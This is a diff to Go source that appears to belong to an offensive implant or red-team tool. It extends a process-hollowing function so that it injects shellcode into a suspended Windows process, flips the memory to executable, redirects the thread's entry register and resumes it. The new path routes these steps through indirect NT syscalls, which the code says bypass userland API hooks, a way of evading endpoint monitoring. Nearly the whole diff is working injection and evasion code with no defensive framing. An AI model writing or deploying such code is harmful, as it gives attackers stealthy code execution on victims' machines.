@@ -208,6 +208,16 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 
 	sb.WriteString(fmt.Sprintf("[+] Created suspended process PID: %d, TID: %d\n", pi.ProcessId, pi.ThreadId))
 
+	// Use indirect syscalls if available (bypasses userland API hooks)
+	if IndirectSyscallsAvailable() {
+		return hollowIndirect(&sb, shellcode, pi)
+	}
+	return hollowStandard(&sb, shellcode, pi)
+}
+
+func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInformation) (string, error) {
+	sb.WriteString("[*] Using standard Win32 API calls\n")
+
 	// Step 2: Allocate RW memory in the new process
 	sb.WriteString(fmt.Sprintf("[*] Allocating %d bytes in target process...\n", len(shellcode)))
 
@@ -271,8 +281,6 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 	sb.WriteString(fmt.Sprintf("[+] Original RCX (entry point): 0x%X\n", ctx.Rcx))
 
 	// Step 6: Set RCX to shellcode address
-	// On x64 CREATE_SUSPENDED, the initial thread's RCX register contains
-	// the entry point. Overwriting it redirects execution to our shellcode.
 	ctx.Rcx = uint64(remoteAddr)
 
 	ret, _, ctxErr = procSetThreadContext.Call(
@@ -296,6 +304,85 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 
 	sb.WriteString("[+] Thread resumed successfully\n")
 	sb.WriteString(fmt.Sprintf("[+] Process hollowing complete — PID %d running shellcode\n", pi.ProcessId))
+
+	return sb.String(), nil
+}
+
+func hollowIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInformation) (string, error) {
+	sb.WriteString("[*] Using indirect syscalls (calls from ntdll)\n")
+
+	// Step 2: Allocate RW memory via NtAllocateVirtualMemory
+	regionSize := uintptr(len(shellcode))
+	var remoteAddr uintptr
+	sb.WriteString(fmt.Sprintf("[*] Allocating %d bytes via NtAllocateVirtualMemory...\n", len(shellcode)))
+
+	status := IndirectNtAllocateVirtualMemory(uintptr(pi.Process), &remoteAddr, &regionSize,
+		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	if status != 0 {
+		_ = syscall.TerminateProcess(pi.Process, 1)
+		return sb.String(), fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%X", status)
+	}
+	sb.WriteString(fmt.Sprintf("[+] Allocated memory at 0x%X\n", remoteAddr))
+
+	// Step 3: Write shellcode via NtWriteVirtualMemory
+	sb.WriteString("[*] Writing shellcode via NtWriteVirtualMemory...\n")
+
+	var bytesWritten uintptr
+	status = IndirectNtWriteVirtualMemory(uintptr(pi.Process), remoteAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
+	if status != 0 {
+		_ = syscall.TerminateProcess(pi.Process, 1)
+		return sb.String(), fmt.Errorf("NtWriteVirtualMemory failed: NTSTATUS 0x%X", status)
+	}
+	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes\n", bytesWritten))
+
+	// Step 4: Change protection to RX via NtProtectVirtualMemory
+	protectAddr := remoteAddr
+	protectSize := uintptr(len(shellcode))
+	var oldProtect uint32
+	status = IndirectNtProtectVirtualMemory(uintptr(pi.Process), &protectAddr, &protectSize,
+		PAGE_EXECUTE_READ, &oldProtect)
+	if status != 0 {
+		_ = syscall.TerminateProcess(pi.Process, 1)
+		return sb.String(), fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%X", status)
+	}
+	sb.WriteString("[+] Memory protection set to RX\n")
+
+	// Step 5: Get thread context via NtGetContextThread
+	sb.WriteString("[*] Getting thread context via NtGetContextThread...\n")
+
+	ctx := CONTEXT_AMD64{}
+	ctx.ContextFlags = 0x10001B // CONTEXT_FULL
+
+	status = IndirectNtGetContextThread(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
+	if status != 0 {
+		_ = syscall.TerminateProcess(pi.Process, 1)
+		return sb.String(), fmt.Errorf("NtGetContextThread failed: NTSTATUS 0x%X", status)
+	}
+	sb.WriteString(fmt.Sprintf("[+] Original RCX (entry point): 0x%X\n", ctx.Rcx))
+
+	// Step 6: Set RCX to shellcode address via NtSetContextThread
+	ctx.Rcx = uint64(remoteAddr)
+
+	status = IndirectNtSetContextThread(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
+	if status != 0 {
+		_ = syscall.TerminateProcess(pi.Process, 1)
+		return sb.String(), fmt.Errorf("NtSetContextThread failed: NTSTATUS 0x%X", status)
+	}
+	sb.WriteString(fmt.Sprintf("[+] Set RCX to shellcode at 0x%X\n", remoteAddr))
+
+	// Step 7: Resume thread via NtResumeThread
+	sb.WriteString("[*] Resuming thread via NtResumeThread...\n")
+
+	var prevCount uint32
+	status = IndirectNtResumeThread(uintptr(pi.Thread), &prevCount)
+	if status != 0 {
+		_ = syscall.TerminateProcess(pi.Process, 1)
+		return sb.String(), fmt.Errorf("NtResumeThread failed: NTSTATUS 0x%X", status)
+	}
+
+	sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))
+	sb.WriteString(fmt.Sprintf("[+] Indirect syscall hollowing complete — PID %d running shellcode\n", pi.ProcessId))
 
 	return sb.String(), nil
 }
